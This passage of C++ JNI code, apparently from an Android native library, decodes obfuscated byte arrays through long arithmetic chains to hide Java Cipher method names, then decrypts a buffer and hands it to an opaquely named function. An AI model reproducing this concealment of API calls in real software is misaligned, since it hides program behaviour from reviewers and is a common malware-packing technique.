        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0x56;
        c -= 0xde;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c -= 0xd2;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c ^= 0x1f;
        c -= m;
        c ^= m;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0xea;
        c ^= m;
        c += 0x99;
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c += 0xc2;
        c ^= m;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0xf5;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c -= m;
        c = ~c;
        c ^= 0x1d;
        c -= m;
        c = (c >> 0x5) | (c << 0x3);
        c = ~c;
        c ^= 0x34;
        c = -c;
        c = ~c;
        c -= 0x67;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c ^= m;
        c -= m;
        c ^= m;
        c = (c >> 0x5) | (c << 0x3);
        c += 0xb5;
        c ^= m;
        c -= m;
        c ^= m;
        c = -c;
        c ^= m;
        c -= 0xc7;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c = -c;
        c -= 0x9a;
        c ^= 0x1e;
        c += m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0xdf;
        c = (c >> 0x5) | (c << 0x3);
        c += 0x28;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c ^= m;
        c += 0x9b;
        c = ~c;
        c ^= 0xea;
        c = -c;
        ss6s[m] = c;
    }

    unsigned char sd5[] =
            {

                    0xfe, 0x2b, 0x74, 0xf1, 0x16, 0x58, 0x8
            };

    for (unsigned int m = 0; m < sizeof(sd5); ++m) {
        unsigned char c = sd5[m];
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c ^= m;
        c += 0x5d;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0xfd;
        c = (c >> 0x1) | (c << 0x7);
        c += 0xd8;
        c ^= 0x5d;
        c -= m;
        c ^= 0xf9;
        c -= 0x4c;
        c = ~c;
        c += m;
        c ^= 0x2b;
        c += m;
        c ^= m;
        c -= 0x2e;
        c = -c;
        sd5[m] = c;
    }

    cipherDoFinal_d_1 = env->GetMethodID(cipherClass_d_1, (char *)ss6s, (char *) sd5);
    unsigned char ss7s[] =
            {

                    0x6, 0xf8, 0x37, 0x30, 0xf6, 0x4e, 0xbe, 0x8f,
                    0x0, 0xf5, 0xc5, 0x46, 0x44, 0x72, 0x65, 0x14,
                    0xf1, 0xc8, 0xdd, 0x39, 0x9e
            };

    for (unsigned int m = 0; m < sizeof(ss7s); ++m)
    {
        unsigned char c = ss7s[m];
        c ^= m;
        c += m;
        c = -c;
        c -= 0x82;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c = -c;
        c += 0x66;
        c = ~c;
        c ^= m;
        c += m;
        c = -c;
        c -= 0xe6;
        c = ~c;
        c ^= m;
        c += m;
        c = -c;
        c -= 0x47;
        c = ~c;
        c += m;
        c ^= m;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0xcc;
        c = ~c;
        c += 0xe5;
        c = ~c;
        c ^= m;
        c -= m;
        c ^= 0x8b;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c ^= m;
        c = -c;
        c -= 0x3c;
        c ^= 0xd8;
        c += m;
        c ^= 0x7b;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c += m;
        c ^= 0xf8;
        c = -c;
        c = ~c;
        c = -c;
        c += m;
        c = -c;
        c = ~c;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c -= 0x98;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c -= m;
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c -= m;
        c = ~c;
        c -= 0xd6;
        c ^= 0x10;
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c += 0x40;
        c ^= 0x2a;
        c += m;
        c ^= 0xda;
        c += 0x7c;
        c = ~c;
        c += 0x2e;
        c = ~c;
        c -= 0x31;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0xb1;
        c = -c;
        c ^= 0xc1;
        c = (c >> 0x3) | (c << 0x5);
        c = ~c;
        c += m;
        c ^= 0x1f;
        c -= m;
        c ^= m;
        c += 0x95;
        c = (c >> 0x3) | (c << 0x5);
        ss7s[m] = c;
    }


    transformation_d_1 = env->NewStringUTF((char*)ss7s);
    cipher_d_1 = env->CallStaticObjectMethod(cipherClass_d_1, cipherGetInstance__d_1,
                                             transformation_d_1);

    // Initialize the cipher_d_1 for decryption (Cipher.DECRYPT_MODE = 2)
    env->CallVoidMethod(cipher_d_1, cipherInit__d_1, 2, secretKeySpec_d_1);

    // Decrypt the data
    result_d_1 = (jbyteArray) env->CallObjectMethod(cipher_d_1, cipherDoFinal_d_1, buffer);

    // Clean up local references
    env->DeleteLocalRef(keyArray_d_1);
    env->DeleteLocalRef(aesString_d_3);
    env->DeleteLocalRef(secretKeySpec_d_1);
    env->DeleteLocalRef(transformation_d_1);
    env->DeleteLocalRef(cipher_d_1);

    awe982rhaf(env, obj, result_d_1, str);
}